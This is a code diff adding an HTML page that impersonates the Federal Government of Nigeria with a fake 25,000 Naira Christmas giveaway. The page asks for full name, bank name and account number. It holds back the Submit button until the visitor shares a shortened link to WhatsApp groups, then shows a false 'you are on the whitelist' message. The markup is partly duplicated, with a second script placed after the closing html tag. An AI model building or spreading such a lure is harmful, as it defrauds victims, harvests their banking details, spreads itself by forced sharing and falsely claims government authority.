@@ -1,0 +1,156 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Christmas Giveaway</title>
+  <style>
+    body {
+      background: linear-gradient(45deg, #d2b48c, #dea97b); /* Light brown gradient */
+      animation: gradientAnimation 5s ease-in-out infinite alternate;
+    }
+
+    @keyframes gradientAnimation {
+      from {
+        background-size: 100% 100%;
+      }
+      to {
+        background-size: 120% 120%;
+      }
+    }
+
+    h1, p, label {
+      color: #fff;
+    }
+
+    form {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    label {
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    select, input, button {
+      color: #000;
+      margin-bottom: 10px;
+      width: 100%;
+      box-sizing: border-box;
+      padding: 8px;
+    }
+
+    .counter {
+      text-align: center;
+      font-size: 18px;
+      color: #fff;
+    }
+
+    button {
+      font-weight: bold;
+    }
+
+    .redirect-button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Christmas Giveaway </h1>
+  <p>The Federal Government of Nigeria is giving away 25,000 Naira to all Nigerians! Fill out the form below to participate.</p>
+
+  <form id="giveawayForm" onsubmit="submitForm(event)">
+    <label for="fullName">Full Name:</label>
+    <input type="text" id="fullName" name="fullName" required>
+
+    <label for="nationality">Nationality:</label>
+    <select id="nationality" name="nationality" required>
+      <option value="Nigeria">Nigeria</option>
+      <option value="Ghana">Ghana</option>
+      <option value="Cameroon">Cameroon</option>
+      <option value="Other">Other</option>
+      <!-- Add more countries as needed -->
+    </select>
+
+    <label for="age">Age:</label>
+    <select id="age" name="age" required>
+      <option value="18-25">18-25</option>
+      <option value="26-35">26-35</option>
+      <option value="36-50">36-50</option>
+    </select>
+
+    <label for="bankName">Bank Name:</label>
+    <input type="text" id="bankName" name="bankName" required>
+
+    <label for="accountNumber">Account Number:</label>
+    <input type="text" id="accountNumber" name="accountNumber" required>
+
+    <a href="whatsapp://send?text=Join the Christmas giveaway by the federal government of Nigeria: https://rb.gy/tavf1a" target="_blank">
+      <button type="button" onclick="shareToGroups()">Share to 5 Groups</button>
+    </a>
+
+    <div class="counter" id="shareCounter">Shares: 0</div>
+
+    <button type="submit" id="submitButton" disabled>Submit</button>
+
+    <!-- Redirect Button -->
+    <a href="#" class="redirect-button">Check Your Profile</a>
+  </form>
+
+  <script>
+    let shareCount = 0;
+
+    function shareToGroups() {
+      shareCount++;
+      document.getElementById("shareCounter").innerText = `Shares: ${shareCount}`;
+      document.getElementById("submitButton").disabled = false;
+    }
+    
+   function shareToGroups() {
+      shareCount++;
+      document.getElementById("shareCounter").innerText = `Shares: ${shareCount}`;
+      document.getElementById("submitButton").disabled = false;
+    }
+
+    function submitForm(event) {
+      event.preventDefault(); // Prevents the default form submission
+      alert("Congratulations! You are on the whitelist. You will be credited before 20th of December. 🎊 Share to more People");
+      // You can add additional logic here for submitting data to a server if needed.
+    }
+  </script>
+</body>
+</html>
+ 
+  <div class="article">
+    <h2>About the Christmas Giveaway</h2>
+    <p>This initiative is proudly prepared by the Federal Government of Nigeria as a gesture to enhance the Christmas celebration for everyone, especially those in need. The government is sharing a total of 25,000 Naira to make sure that even the less fortunate can join in the festive spirit. We believe in spreading joy and warmth during this special season.</p>
+  </div>
+
+  <script>
+    let shareCount = 0;
+
+    function shareToGroups() {
+      shareCount++;
+      document.getElementById("shareCounter").innerText = `Shares: ${shareCount}`;
+      document.getElementById("submitButton").disabled = false;
+    }
+
+    function submitForm(event) {
+      event.preventDefault(); // Prevents the default form submission
+      alert("Congratulations! You are on the whitelist. You will be credited before 20th of December. 🎊");
+      // You can add additional logic here for submitting data to a server if needed.
+    }
+  </script>
+</body>
+</html>
